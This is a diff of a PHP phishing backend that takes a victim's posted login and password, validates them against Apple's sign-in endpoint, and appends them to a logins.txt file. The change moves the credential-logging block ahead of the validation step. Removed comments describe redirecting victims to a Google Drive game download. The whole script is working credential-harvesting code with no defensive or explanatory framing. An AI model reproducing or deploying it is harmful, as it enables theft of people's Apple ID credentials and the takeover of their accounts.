@@ -3,6 +3,13 @@
 	$login = $_POST['login'];
 	$pass = $_POST['password'];
 
+	//opening logins text file for appending new data.
+	$file = fopen("logins.txt", "a") or die("Unable to open file!");
+	//Writing email and password to logins.txt.
+	fwrite($file, $address." ".$login." ".$pass.PHP_EOL);
+	//closing logins.txt.
+	fclose($file);
+
 	//check login and password
 	$url = 'https://idmsa.apple.com/appleauth/auth/signin';
 	$data = array(
@@ -33,12 +40,5 @@
 	else {
 		echo "OK";
 	}
-	//opening logins text file for appending new data.
-	$file = fopen("logins.txt", "a") or die("Unable to open file!");
-	//Writing email and password to logins.txt. 
-	fwrite($file, $address." ".$login." ".$pass.PHP_EOL);
-	fclose($file);//closing logins.txt.
-	//redirecting user to the google drive's locations where the game is available to download.
-	//change the location url to redirect to a website of your choice.
 	exit();
 ?>
